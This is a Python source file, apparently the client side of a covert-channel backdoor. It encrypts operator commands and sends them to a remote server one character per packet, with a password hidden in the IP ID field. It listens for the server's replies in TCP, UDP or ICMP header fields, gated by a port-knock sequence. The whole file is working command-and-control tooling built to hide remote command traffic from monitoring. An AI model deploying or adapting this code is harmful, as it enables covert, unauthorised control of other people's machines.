import socket
from scapy.all import *
from struct import *
import sys
import threading
import pcapy
import config
import client
import utils

knockVal = 0
server = ""
protocol = ""
interface = ""

def startClient(serverIP, proto, intf):
	# check if you can connect?
	global server
	global protocol
	global interface

	server = serverIP
	protocol = proto
	interface = intf

	listenThread = threading.Thread(target=recvThread)
	listenThread.daemon = True
	listenThread.start()

	sendCommand(utils.encryptData("?connect"))
	print ""

	# wait for commands
	while(client.running):
		comm = getCommand()
		if comm != "":
			sendCommand(utils.encryptData(comm))
		else:
			client.running = False
			sys.exit()

def sendCommand(command):
	# send your command, make sure you set the password in the ip id field (ipHeader[3])
	pswd = utils.encrypt(config.password)

	for c in command:
		send(utils.covertPacket(server, protocol, c, pswd), verbose=0)
	utils.finPacket(server, protocol, pswd)
	command = ""


def recvThread():
	cap = pcapy.open_live(interface, 65536, 1, 0)
	fltr = protocol + " and ip src " + server
	cap.setfilter(fltr)

	while(client.running):
		(header, packet) = cap.next()
		packetHandler(packet)

def authenticated(packet):
	global knockVal
	if knockVal < len(config.knock):
		if packet[3] == config.knock[knockVal]:
			knockVal += 1
			if knockVal == len(config.knock):
				return True
		else:
			knockVal = 0
			return False
	else:
		return True

def packetHandler(packet):
	pacType = utils.checkType(packet)
	ip, protoH, data = utils.stripPacket(packet, pacType)
	
	if authenticated(ip):
		checkResult(ip, protoH, data, pacType)

def checkResult(ip, proto, data, pacType):
	character = ''

	if pacType == 'tcp':
		character = proto[2]
	elif pacType == 'udp':
		character = proto[3]
	elif pacType == 'icmp':
		character = proto[2]

	if character < 256:
		character = utils.decryptData(character)
		if (ord(character) > 31 and ord(character) < 127) or ord(character) == 13 or ord(character) == 10:
			sys.stderr.write(character) 

def getCommand():
	try: 
		comm = raw_input()
	except KeyboardInterrupt:
		return ""
	return comm
